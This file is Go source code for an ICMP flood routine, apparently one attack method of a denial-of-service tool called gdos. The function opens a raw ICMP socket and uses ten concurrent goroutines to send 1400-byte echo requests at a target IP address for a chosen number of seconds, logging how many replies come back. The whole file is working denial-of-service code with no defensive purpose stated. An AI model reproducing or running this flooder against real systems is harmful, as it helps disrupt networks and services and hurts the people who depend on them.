package methods

import (
	"fmt"
	"gdos/modules/core"
	"net"
	"os"
	"strconv"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func IMCP(target string, last string) {
	duration, err := strconv.Atoi(last)
	if err != nil {
		fmt.Println("Error converting duration to integer:", err)
		os.Exit(1)
	}

	mtu := 1400
	timeout := 2 * time.Second
	id := core.Random()

	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		fmt.Println("Error listening for ICMP packets:", err)
		os.Exit(1)
	}
	defer conn.Close()

	oversizedData := make([]byte, mtu)
	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   id & 0xffff,
			Seq:  1,
			Data: oversizedData,
		},
	}

	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)

	sendChan := make(chan int, 100)
	recvChan := make(chan int, 100)

	numSenders := 10
	numReceivers := 10

	for i := 0; i < numSenders; i++ {
		go func() {
			for time.Now().Before(endTime) {
				sendChan <- 1
			}
		}()
	}

	for i := 0; i < numReceivers; i++ {
		go func() {
			for range sendChan {
				b, err := msg.Marshal(nil)
				if err != nil {
					fmt.Println("Error encoding ICMP message:", err)
					os.Exit(1)
				}

				_, err = conn.WriteTo(b, &net.IPAddr{IP: net.ParseIP(target)})
				if err != nil {
					fmt.Println("Error sending ICMP message:", err)
					os.Exit(1)
				}

				recvChan <- 1
			}
		}()
	}

	totalSent := 0

	for range recvChan {
		err = conn.SetReadDeadline(time.Now().Add(timeout))
		if err != nil {
			fmt.Println("Error setting read deadline:", err)
			os.Exit(1)
		}

		reply := make([]byte, 1500)
		n, _, err := conn.ReadFrom(reply)
		if err == nil {
			rm, err := icmp.ParseMessage(ipv4.ICMPTypeEchoReply.Protocol(), reply[:n])
			if err != nil {
				fmt.Println("Error parsing ICMP response:", err)
				os.Exit(1)
			}

			switch rm.Type {
			case ipv4.ICMPTypeEchoReply:
				totalSent++
				elapsed := time.Since(startTime).Seconds()
				fmt.Printf("[+] Sent %d | Elapsed %.2f Seconds.\n", totalSent, elapsed)
			default:
				fmt.Printf("Received unexpected ICMP message from %s: %+v\n", target, rm)
			}
		} else {
			os.Exit(0)
		}
	}
}
